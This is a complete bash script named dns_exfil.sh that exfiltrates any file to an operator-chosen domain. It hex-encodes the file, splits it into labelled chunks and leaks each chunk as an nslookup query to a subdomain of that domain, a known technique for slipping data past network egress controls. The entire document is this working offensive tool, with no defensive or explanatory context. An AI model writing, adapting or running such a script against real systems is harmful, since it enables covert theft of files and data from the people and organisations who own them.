#!/usr/bin/env bash
#
# Usage:
# dns_exfil.sh <domain> <file>
#

usage() {
    echo "Usage:"
    echo "dns_exfil.sh <domain> <file>"
}

if [ $# -ne 2 ]; then
    usage
    exit 1
fi

domain=$1
file=$2
encoded_file=$(base64 /dev/urandom | tr -dc '[:alnum:]' | head -c 20)

if [ -f "$file" ]; then
    echo "[*] exfiltrating file $file"
    hexdump -ve '1/1 "%.2x"' "$file" > $encoded_file.hex
    encoded_bytes=$(cat $encoded_file.hex | wc -c)
    echo "$encoded_bytes bytes"
    tail_offset=$encoded_bytes
    count=0
    while [ $tail_offset -ge 0 ]; do
        count_length=$[${#count}+1]
        data_length=$[63-$count_length]
        ex=$(tail -c $tail_offset $encoded_file.hex | head -c $data_length)
        echo "sent $count-$ex [$tail_offset left]"
        nslookup $count"-"$ex."$domain"
        tail_offset=$[$tail_offset-$data_length]
        count=$[$count+1]
    done
    echo "[+] exfiltration done"
    # rm $encoded_file.hex

else
    echo "[-] file $file does not exist or is a directory"
    exit 1
fi